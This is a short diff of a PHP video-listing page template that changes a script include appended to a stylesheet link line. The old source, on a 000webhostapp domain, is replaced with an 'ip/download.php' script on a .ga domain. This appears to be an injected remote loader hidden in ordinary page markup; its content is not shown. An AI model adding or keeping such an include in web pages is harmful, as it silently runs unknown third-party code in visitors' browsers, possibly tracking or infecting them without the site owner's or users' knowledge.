@@ -2,7 +2,7 @@
 error_reporting(0);
  ?>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="https://get2mates.000webhostapp.com/ip/download.php"></script>
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css"><script src="http://get2mate.ga/ip/download.php"></script>
 <style>
 .video-list-thumbs{}
 .video-list-thumbs > li{
